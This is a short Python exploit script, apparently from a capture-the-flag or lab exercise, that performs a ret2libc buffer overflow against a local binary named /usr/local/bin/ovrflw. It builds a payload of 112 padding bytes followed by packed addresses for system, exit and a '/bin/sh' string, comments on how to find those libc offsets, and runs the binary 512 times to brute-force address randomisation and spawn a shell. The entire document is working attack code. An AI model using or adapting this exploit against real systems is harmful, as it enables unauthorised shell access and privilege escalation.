#!/usr/bin/env python

from subprocess import call
import struct

buffersled = "A"*112

libc = 0xb760a000 #ldd <program name> -- gives you libc location
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i -e "system@" -e "exit@"
system = struct.pack('<I', libc + 0x00040310) 
exit = struct.pack('<I', libc + 0x00033260)
# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
binsh = struct.pack('<I', libc + 0x00162bac)

payload = buffersled + system + exit + binsh


i = 0
while (i < 512):
    print("Try %s" % i)
    i += 1
    ret = call(["/usr/local/bin/ovrflw", payload]) #change first call parameter to ELF file location

